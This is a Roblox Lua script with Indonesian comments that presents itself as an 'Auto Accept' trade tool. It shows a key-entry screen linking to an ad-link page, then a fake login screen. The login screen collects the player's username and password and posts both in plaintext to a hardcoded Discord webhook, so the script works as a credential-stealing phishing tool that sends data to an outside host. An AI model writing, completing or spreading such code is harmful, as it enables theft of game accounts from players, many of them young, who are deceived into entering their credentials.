-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local httpService = game:GetService("HttpService")
    local data = {
        content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
    }
    
    local jsonData = httpService:JSONEncode(data)
    local success, response = pcall(function()
        return httpService:PostAsync(webhook_url, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord: " .. response)
    end
end

-- Fungsi Membuat GUI Pertama (Key Validation)
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local keyBox = Instance.new("TextBox")
    local submitButton = Instance.new("TextButton")
    local getKeyButton = Instance.new("TextButton")
    local messageLabel = Instance.new("TextLabel")

    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 14
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    messageLabel.Name = "MessageLabel"
    messageLabel.Parent = frame
    messageLabel.Size = UDim2.new(1, 0, 0, 40)
    messageLabel.Position = UDim2.new(0, 0, 0, 110)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Font = Enum.Font.SourceSans
    messageLabel.Text = ""
    messageLabel.TextSize = 14
    messageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    submitButton.Name = "SubmitButton"
    submitButton.Parent = frame
    submitButton.Size = UDim2.new(1, -20, 0, 40)
    submitButton.Position = UDim2.new(0, 10, 0, 160)
    submitButton.Text = "Verifikasi Key"
    submitButton.Font = Enum.Font.SourceSansBold
    submitButton.TextSize = 16
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    getKeyButton.Name = "GetKeyButton"
    getKeyButton.Parent = frame
    getKeyButton.Size = UDim2.new(1, -20, 0, 40)
    getKeyButton.Position = UDim2.new(0, 10, 0, 210)
    getKeyButton.Text = "Get Key"
    getKeyButton.Font = Enum.Font.SourceSansBold
    getKeyButton.TextSize = 16
    getKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    getKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi ketika tombol Verifikasi Key di klik
    submitButton.MouseButton1Click:Connect(function()
        local key = keyBox.Text
        if key == correctKey then
            print("Key valid!")
            messageLabel.Text = "Key Benar! Melanjutkan ke Login..."
            sendToDiscord("Unknown", "Unknown")  -- Placeholder, akan diganti nanti
            gui:Destroy()
            createLoginGUI()  -- Pindah ke GUI login setelah key valid
        else
            print("Key tidak valid!")
            messageLabel.Text = "Key Salah! Silahkan Get Key"
        end
    end)

    -- Fungsi ketika tombol Get Key di klik
    getKeyButton.MouseButton1Click:Connect(function()
        -- Disarankan untuk menambahkan logika untuk mendapatkan key di sini
        print("Mendapatkan Key...")
    end)
end

-- Fungsi Membuat GUI Kedua (Login)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Login"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi ketika tombol Login di klik
    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            sendToDiscord(username, password)
            print("Login sukses!")
        else
            print("Username atau password tidak boleh kosong!")
        end
    end)
end

-- Memulai script dengan GUI pertama
createKeyValidationGUI()
